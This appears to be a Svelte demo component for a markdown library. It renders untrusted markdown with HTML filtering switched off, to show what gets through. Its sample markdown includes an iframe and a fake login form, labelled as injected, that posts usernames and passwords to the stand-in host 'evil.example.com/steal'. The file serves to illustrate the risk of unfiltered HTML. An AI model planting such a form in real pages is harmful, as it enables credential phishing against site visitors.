<script lang="ts">
    import SvelteMarkdown from '@humanspeak/svelte-markdown'

    const markdown = `## HTML Filtering Demo

This paragraph has **bold** and *italic* markdown formatting.

<div style="padding: 8px; border: 1px solid #ccc; border-radius: 4px;">
This is inside a div element.
</div>

<strong>HTML strong tag</strong> and <em>HTML em tag</em>.

<details>
<summary>Click to expand</summary>
Hidden content inside details/summary tags.
</details>

<iframe src="https://example.com" title="example iframe"></iframe>

<form action="https://evil.example.com/steal" method="POST" style="background: #fef2f2; border: 2px solid #dc2626; padding: 10px; border-radius: 4px; margin-top: 8px;">
  <strong style="color: #b91c1c;">⚠ Fake login (injected by untrusted markdown)</strong>
  <input type="text" placeholder="Username" style="display: block; margin: 6px 0; width: 100%; padding: 4px;" />
  <input type="password" placeholder="Password" style="display: block; margin: 6px 0; width: 100%; padding: 4px;" />
  <button type="submit" style="background: #dc2626; color: white; border: 0; padding: 6px 12px; cursor: pointer;">Sign in</button>
</form>
`
</script>

<!--
  Allow-all HTML — no `renderers` override. Every HTML tag in the markdown
  source survives into the DOM. Iframes load, forms render, styles apply.
  Only safe with content you fully trust.
-->
<div class="mx-auto w-full max-w-4xl p-4">
    <div class="border-border bg-card rounded-xl border p-6 shadow-sm">
        <div class="prose prose-sm dark:prose-invert max-w-none">
            <SvelteMarkdown source={markdown} />
        </div>
    </div>
</div>
